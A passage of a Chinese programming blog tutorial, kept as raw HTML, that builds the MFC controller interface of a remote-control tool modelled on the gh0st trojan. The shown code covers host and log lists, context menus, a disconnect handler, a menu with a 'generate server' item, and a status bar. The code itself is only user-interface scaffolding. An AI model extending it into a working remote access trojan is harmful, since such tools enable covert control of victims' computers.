data-num=\"9\"></td><td><pre>\tm_CList_Online<span class=\"token punctuation\">.</span><span class=\"token function\">SetItemText</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>ONLINELIST_PING<span class=\"token punctuation\">,</span>strPing<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><ol start=\"4\">\n<li>添加日志消息的处理:</li>\n</ol>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token class-name\">CPCRemoteDlg</span><span class=\"token operator\">::</span><span class=\"token function\">ShowMessage</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">bool</span> bIsOK<span class=\"token punctuation\">,</span> CString strMsg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tCString strIsOK<span class=\"token punctuation\">,</span>strTime<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tCTime t<span class=\"token operator\">=</span><span class=\"token class-name\">CTime</span><span class=\"token operator\">::</span><span class=\"token function\">GetCurrentTime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tstrTime<span class=\"token operator\">=</span>t<span class=\"token punctuation\">.</span><span class=\"token function\">Format</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%H:%M:%S\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>bIsOK<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\tstrIsOK<span class=\"token operator\">=</span><span class=\"token string\">\"执行成功\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\tstrIsOK<span class=\"token operator\">=</span><span class=\"token string\">\"执行失败\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t m_CList_Message<span class=\"token punctuation\">.</span><span class=\"token function\">InsertItem</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>strIsOK<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t m_CList_Message<span class=\"token punctuation\">.</span><span class=\"token function\">SetItemText</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>strTime<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t m_CList_Message<span class=\"token punctuation\">.</span><span class=\"token function\">SetItemText</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>strMsg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><ol start=\"5\">\n<li>添加伪上线，和日志的测试代码，在没有加入 gh0st 传输内核之前是要自己测试的:</li>\n</ol>\n<p>然后在 OnInitDialog  中添加如下代码:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">AddList</span><span class=\"token punctuation\">(</span><span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"192.168.0.1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"本机局域网\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Lang\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Windows7\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"2.2GHZ\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"有\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"123232\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">ShowMessage</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"软件初始化成功...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ol start=\"6\">\n<li>使点击时整个列都是选中状态:</li>\n</ol>\n<p>InitList () 中加入代码:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>m_CList_Online<span class=\"token punctuation\">.</span><span class=\"token function\">SetExtendedStyle</span><span class=\"token punctuation\">(</span>LVS_EX_FULLROWSELECT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>m_CList_Message<span class=\"token punctuation\">.</span><span class=\"token function\">SetExtendedStyle</span><span class=\"token punctuation\">(</span>LVS_EX_FULLROWSELECT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>结果如下：</p>\n<p><img data-src=\"image008.png\" alt=\"\" /></p>\n<h2 id=\"设计列表中的右键菜单\"><a class=\"anchor\" href=\"#设计列表中的右键菜单\">#</a> 设计列表中的右键菜单</h2>\n<ol>\n<li>\n<p>添加菜单资源</p>\n</li>\n<li>\n<p>功能菜单项并写入相应的菜单 ID</p>\n</li>\n</ol>\n<p><img data-src=\"image009.png\" alt=\"\" /></p>\n<ol start=\"3\">\n<li>显示菜单</li>\n</ol>\n<p>(1) 参考 gh0st 代码，看一下 gh0st 是怎样显示菜单的<br />\n a. 找到主菜单<br />\n b. 查看主菜单的 ID<br />\nc. 搜索 IDR_LIST<br />\nd. 分析代码:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>CMenu\tpopup<span class=\"token punctuation\">;</span>                  <span class=\"token comment\">// 声明一个菜单变量</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>popup<span class=\"token punctuation\">.</span><span class=\"token function\">LoadMenu</span><span class=\"token punctuation\">(</span>IDR_LIST<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>       <span class=\"token comment\">// 载入菜单资源</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>CMenu<span class=\"token operator\">*</span>\tpM <span class=\"token operator\">=</span> popup<span class=\"token punctuation\">.</span><span class=\"token function\">GetSubMenu</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 得到菜单项</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>CPoint\tp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">GetCursorPos</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>                    <span class=\"token comment\">// 得到鼠标指针的位置</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">int</span>\tcount <span class=\"token operator\">=</span> pM<span class=\"token operator\">-></span><span class=\"token function\">GetMenuItemCount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>       <span class=\"token comment\">// 得到菜单的个数</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>m_pListCtrl<span class=\"token operator\">-></span><span class=\"token function\">GetSelectedCount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">// 如果没有选中列表中的条目</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> count <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>       <span class=\"token comment\">// 遍历每一个菜单</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tpM<span class=\"token operator\">-></span><span class=\"token function\">EnableMenuItem</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> MF_BYPOSITION <span class=\"token operator\">|</span> MF_DISABLED <span class=\"token operator\">|</span> MF_GRAYED<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 该项变灰</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>pM<span class=\"token operator\">-></span><span class=\"token function\">EnableMenuItem</span><span class=\"token punctuation\">(</span>count <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> MF_BYPOSITION <span class=\"token operator\">|</span> MF_DISABLED <span class=\"token operator\">|</span> MF_GRAYED<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">// 全选</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>m_pListCtrl<span class=\"token operator\">-></span><span class=\"token function\">GetItemCount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\">// 列表中的条目项大于 0     </span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>pM<span class=\"token operator\">-></span><span class=\"token function\">EnableMenuItem</span><span class=\"token punctuation\">(</span>count <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> MF_BYPOSITION <span class=\"token operator\">|</span> MF_ENABLED<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 激活倒数第二个菜单 </span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>pM<span class=\"token operator\">-></span><span class=\"token function\">EnableMenuItem</span><span class=\"token punctuation\">(</span>count <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> MF_BYPOSITION <span class=\"token operator\">|</span> MF_DISABLED <span class=\"token operator\">|</span> MF_GRAYED<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 否则变灰</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>pM<span class=\"token operator\">-></span><span class=\"token function\">TrackPopupMenu</span><span class=\"token punctuation\">(</span>TPM_LEFTALIGN<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 在指定位置显示菜单</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>(2) 添加我们的代码</p>\n<p>a. 添加右键列表的响应函数</p>\n<p><img data-src=\"image010.png\" alt=\"\" /></p>\n<p>b. 添加代码</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>CMenu\tpopup<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>popup<span class=\"token punctuation\">.</span><span class=\"token function\">LoadMenu</span><span class=\"token punctuation\">(</span>IDR_MENU_ONLINE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>CMenu<span class=\"token operator\">*</span>\tpM <span class=\"token operator\">=</span> popup<span class=\"token punctuation\">.</span><span class=\"token function\">GetSubMenu</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>CPoint\tp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">GetCursorPos</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">int</span>\tcount <span class=\"token operator\">=</span> pM<span class=\"token operator\">-></span><span class=\"token function\">GetMenuItemCount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>m_CList_Online<span class=\"token punctuation\">.</span><span class=\"token function\">GetSelectedCount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>       <span class=\"token comment\">// 如果没有选中</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> count<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>pM<span class=\"token operator\">-></span><span class=\"token function\">EnableMenuItem</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> MF_BYPOSITION <span class=\"token operator\">|</span> MF_DISABLED <span class=\"token operator\">|</span> MF_GRAYED<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>          <span class=\"token comment\">// 菜单全部变灰</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>pM<span class=\"token operator\">-></span><span class=\"token function\">TrackPopupMenu</span><span class=\"token punctuation\">(</span>TPM_LEFTALIGN<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>附上结果：</p>\n<p><img data-src=\"image011.png\" alt=\"\" /></p>\n<h2 id=\"添加菜单消息响应-删除列表中的条目\"><a class=\"anchor\" href=\"#添加菜单消息响应-删除列表中的条目\">#</a> 添加菜单消息响应、删除列表中的条目</h2>\n<ol>\n<li>添加菜单消息响应的函数:</li>\n</ol>\n<p>终端管理     进程管理    窗口管理    桌面管理     文件管理    语音管理     视频管理   服务管理     注册表管理</p>\n<p>这里可以直接对着菜单中的条目右键选择添加事件处理程序：</p>\n<p><img data-src=\"image012.png\" alt=\"\" /></p>\n<p>也可以在类视图中对对话框右键选择属性，点击事件，然后如下添加事件处理程序：</p>\n<p><img data-src=\"image013.png\" alt=\"\" /></p>\n<ol start=\"2\">\n<li>删除列表中的条目:<br />\n 查找函数:<br />\n(1)  <code>CListCtrl::DeleteItem()</code></li>\n</ol>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>BOOL <span class=\"token function\">DeleteItem</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> nItem              <span class=\"token comment\">// 列表的索引  从 0 开始</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>(2)  <code>GetSelectionMark()</code> <br />\n 我们还要得到选中的是哪一行。<br />\n <code>int GetSelectionMark( );        //得到用户选中的条目索引</code></p>\n<ol start=\"3\">\n<li>添加下线菜单  断开连接   ID:   IDM_ONLINE_DELETE</li>\n</ol>\n<p>这个我之前已经添加了</p>\n<ol start=\"4\">\n<li>添加菜单中的断开链接的响应代码:</li>\n</ol>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> iSelect<span class=\"token operator\">=</span>m_CList_Online<span class=\"token punctuation\">.</span><span class=\"token function\">GetSelectionMark</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>m_CList_Online<span class=\"token punctuation\">.</span><span class=\"token function\">DeleteItem</span><span class=\"token punctuation\">(</span>iSelect<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ol start=\"5\">\n<li>产生下线日志:</li>\n</ol>\n<p>我们要知道哪一个主机断开了连接，既获取下线主机的 IP。可以用这个函数：</p>\n<p><code>CListCtrl::GetItemText </code></p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>CString <span class=\"token function\">GetItemText</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> nItem<span class=\"token punctuation\">,</span>          <span class=\"token comment\">// 哪一行</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> nSubItem        <span class=\"token comment\">// 行中的那个子列</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">)</span> <span class=\"token keyword\">const</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ol start=\"6\">\n<li>接着添加代码:</li>\n</ol>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>CString strIP<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> iSelect<span class=\"token operator\">=</span>m_CList_Online<span class=\"token punctuation\">.</span><span class=\"token function\">GetSelectionMark</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>strIP<span class=\"token operator\">=</span>m_CList_Online<span class=\"token punctuation\">.</span><span class=\"token function\">GetItemText</span><span class=\"token punctuation\">(</span>iSelect<span class=\"token punctuation\">,</span>ONLINELIST_IP<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>m_CList_Online<span class=\"token punctuation\">.</span><span class=\"token function\">DeleteItem</span><span class=\"token punctuation\">(</span>iSelect<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>strIP<span class=\"token operator\">+=</span><span class=\"token string\">\"断开连接\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">ShowMessage</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>strIP<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>附上结图:</p>\n<p><img data-src=\"image014.png\" alt=\"\" /></p>\n<h2 id=\"为对话框添加菜单栏及其事件响应\"><a class=\"anchor\" href=\"#为对话框添加菜单栏及其事件响应\">#</a> 为对话框添加菜单栏及其事件响应</h2>\n<ol>\n<li>\n<p>创建菜单的资源  ID:  IDR_MENU_MAIN</p>\n</li>\n<li>\n<p>添加菜单:</p>\n</li>\n</ol>\n<p>选项 -- 参数设置 (IDM_MAIN_SET)---- 生成服务端 (IDM_MAIN_BUILD)-- 退出 (IDM_MAIN_CLOSE)<br />\n 帮助 -- 关于 (IDM_MAIN_ABOUT)</p>\n<p><img data-src=\"image015.png\" alt=\"\" /></p>\n<ol start=\"3\">\n<li>为对话框添加代码，显示菜单:</li>\n</ol>\n<p>(1) 认识几个 API 函数:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>HMENU <span class=\"token function\">LoadMenu</span><span class=\"token punctuation\">(</span>                    <span class=\"token comment\">// 载入菜单 </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tHINSTANCE hInstance<span class=\"token punctuation\">,</span>          <span class=\"token comment\">// 资源所在文件模块的句柄标识</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tLPCTSTR lpMenuName           <span class=\"token comment\">// 资源 ID</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>BOOL <span class=\"token function\">SetMenu</span><span class=\"token punctuation\">(</span>                  <span class=\"token comment\">// 为窗口设置菜单</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tHWND hWnd<span class=\"token punctuation\">,</span>                 <span class=\"token comment\">// 要设置菜单的窗口句柄</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tHMENU hMenu                <span class=\"token comment\">// 菜单标识</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>BOOL <span class=\"token function\">DrawMenuBar</span><span class=\"token punctuation\">(</span>          <span class=\"token comment\">// 显示菜单</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\tHWND hWnd          <span class=\"token comment\">// 要显示菜单的窗口句柄</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>(2) 在  <code>OnInitDialog</code>  中添加添加菜单的代码</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>HMENU hmenu<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>hmenu<span class=\"token operator\">=</span><span class=\"token function\">LoadMenu</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token function\">MAKEINTRESOURCE</span><span class=\"token punctuation\">(</span>IDR_MENU_MAIN<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 载入菜单资源</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">::</span><span class=\"token function\">SetMenu</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token operator\">-></span><span class=\"token function\">GetSafeHwnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>hmenu<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>                  <span class=\"token comment\">// 为窗口设置菜单</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">::</span><span class=\"token function\">DrawMenuBar</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token operator\">-></span><span class=\"token function\">GetSafeHwnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>                    <span class=\"token comment\">// 显示菜单</span></pre></td></tr></table></figure><ol start=\"3\">\n<li>为每一个菜单添加事件响应</li>\n</ol>\n<p>添加事件响应函数。</p>\n<ol start=\"4\">\n<li>添加代码:</li>\n</ol>\n<p>退出菜单代码:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>BOOL <span class=\"token function\">PostMessage</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t\tHWND hWnd<span class=\"token punctuation\">,</span>             <span class=\"token comment\">// 标识向那个窗口发送消息</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\tUINT Msg<span class=\"token punctuation\">,</span>              <span class=\"token comment\">// 消息内容</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\tWPARAM wParam<span class=\"token punctuation\">,</span>         <span class=\"token comment\">// 消息参数</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\tLPARAM lParam          <span class=\"token comment\">// 消息参数</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>PostMessage(WM_CLOSE,0,0);</code></p>\n<p>菜单中关于项的响应代码:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>CAboutDlg dlgAbout<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>dlgAbout<span class=\"token punctuation\">.</span><span class=\"token function\">DoModal</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>其他代码用  <code>MessageBox</code>  代替。</p>\n<h2 id=\"为对话框添加状态条并在态条上显示文字\"><a class=\"anchor\" href=\"#为对话框添加状态条并在态条上显示文字\">#</a> 为对话框添加状态条并在态条上显示文字</h2>\n<ol>\n<li>\n<p>创建字符串资源  ID:  IDR_STATUSBAR_STRING</p>\n</li>\n<li>\n<p>添加状态条变量:</p>\n</li>\n</ol>\n<p><code>CStatusBar  m_wndStatusBar;             //状态条</code></p>\n<p>3. 查看 MSDN:</p>\n<p><code>CStatusBar::SetIndicators</code></p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>BOOL <span class=\"token function\">SetIndicators</span><span class=\"token punctuation\">(</span>           <span class=\"token comment\">// 在状态条中加入对应字符串 ID</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">const</span> UINT<span class=\"token operator\">*</span> lpIDArray<span class=\"token punctuation\">,</span>   <span class=\"token comment\">// 字符串 ID         </span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">int</span> nIDCount     <span class=\"token comment\">// 个数</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">SetPaneInfo</span><span class=\"token punctuation\">(</span>         <span class=\"token comment\">// 设置状态条的显示状态</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token keyword\">int</span> nIndex<span class=\"token punctuation\">,</span>     <span class=\"token comment\">// 状态条的索引</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\tUINT<span class=\"token operator\">&amp;</span> nID<span class=\"token punctuation\">,</span>      <span class=\"token comment\">// 状态条的字符 ID</span></pre></td></tr><tr><td 